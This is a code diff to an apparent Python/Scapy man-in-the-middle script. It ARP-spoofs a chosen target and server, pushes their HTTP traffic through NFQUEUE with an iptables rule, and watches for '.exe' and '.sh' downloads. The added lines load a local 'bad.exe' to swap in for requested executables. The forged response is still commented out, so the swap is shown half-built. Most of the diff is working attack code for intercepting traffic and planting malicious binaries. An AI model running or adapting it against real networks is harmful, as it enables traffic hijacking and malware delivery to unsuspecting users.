@@ -15,6 +15,17 @@ load_layer("http")
 
 target_MAC, server_MAC = None, None
 
+# Add NFQueue to forwarding rules
+os.system('iptables -A FORWARD -p tcp --dport 80 -j NFQUEUE --queue-num 1')
+print("\nAdded Forward rule")
+
+# Parse the server and target IP arguments
+parser = argparse.ArgumentParser(description='Get Target and Server') 
+parser.add_argument('target_ip', type=str, help='Target IP')
+parser.add_argument('server_ip', type=str, help='Server IP')
+args = parser.parse_args() 
+
+
 def ARP_loop(tar, ser):
     while not finished:
         send(ARP(op=2, pdst=ser, psrc=tar), iface=interface, verbose=False)
@@ -59,31 +70,36 @@ def q_callback(packet):
 
     raw_pkt = packet.get_payload()
     pkt = IP(raw_pkt)
-
-    if TCP in pkt:  
-        tcp_pkt = pkt[TCP] 
-        print(f"TCP Packet: {tcp_pkt.sport} -> {tcp_pkt.dport}")
-        if tcp_pkt.dport == 80 and HTTPRequest in tcp_pkt:
-            # The packet is an HTTP request, so we can directly access its fields
-            http_request = tcp_pkt[HTTPRequest] 
-            path = http_request.Path.decode()
-            if path[-4:] == ".exe" or path[-3:] == ".sh":
-                print(".exe received")
-                print(path)
+    if pkt.src == args.target_ip and pkt.dst == args.server_ip:
+        if TCP in pkt:  
+            tcp_pkt = pkt[TCP] 
+            print(f"TCP Packet: {tcp_pkt.sport} -> {tcp_pkt.dport}")
+            if tcp_pkt.dport == 80 and HTTPRequest in tcp_pkt:
+                # The packet is an HTTP request, so we can directly access its fields
+                http_request = tcp_pkt[HTTPRequest] 
+                path = http_request.Path.decode()
+                if path[-4:] == ".exe" :
+                    with open("./bad.exe", "rb") as file:
+                        bad_content = file.read()
+                    # http_response = HTTPResponse(
+                    #                     Status_Code=200,
+                    #                     Reason_Phrase=b"OK",
+                    #                     Headers=[
+                    #                         (b"Content-Type", b"application/octet-stream"),
+                    #                         (b"Content-Disposition", b"attachment; filename=good.exe"),
+                    #                         (b"Content-Length", str(len(bad_content)).encode()),
+                    #                     ],
+                    #                     body=bad_content
+                    #                 )
+                    # http_response = IP(src=args.server_ip, dst="10.10.1.60")/TCP(sport=80, dport=3389, flags="A", seq=ACK.ack, ack=ACK.seq)/RESP
+                    print(".exe received")
+                    print(path)
+                elif path[-3:] == ".sh":
+                    print(".sh request received")
 
     packet.accept()                       
 
 try:
-
-    # Add NFQueue to forwarding rules
-    os.system('iptables -A FORWARD -p tcp --dport 80 -j NFQUEUE --queue-num 1')
-    print("\nAdded Forward rule")
-
-    # Parse the server and target IP arguments
-    parser = argparse.ArgumentParser(description='Get Target and Server') 
-    parser.add_argument('target_ip', type=str, help='Target IP')
-    parser.add_argument('server_ip', type=str, help='Server IP')
-    args = parser.parse_args() 
 
     # Get the MAC of target and server to fix their ARP tables later
     target_MAC = get_mac(args.target_ip)
@@ -107,7 +123,7 @@ try:
     nfqueue.bind(1, q_callback)    
     #Running filter queue                    
     nfqueue.run()                                      
-except KeyboardInterrupt:
+except Exception as e:
     os.system('iptables -F')                     # flush all iptables rule
     finished = True  # Signal the thread to stop
     packet = ARP(op=2, pdst=args.server_ip, psrc=args.target_ip, hwsrc=target_MAC,hwdst=server_MAC)
@@ -116,5 +132,3 @@ except KeyboardInterrupt:
     packet = ARP(op=2, pdst=args.target_ip, psrc=args.server_ip, hwsrc=server_MAC, hwdst=target_MAC)
     send(packet, iface=interface, count = 5)
     print(f"\nFixed Client ARP table")
-except Exception as e:
-    print(e)
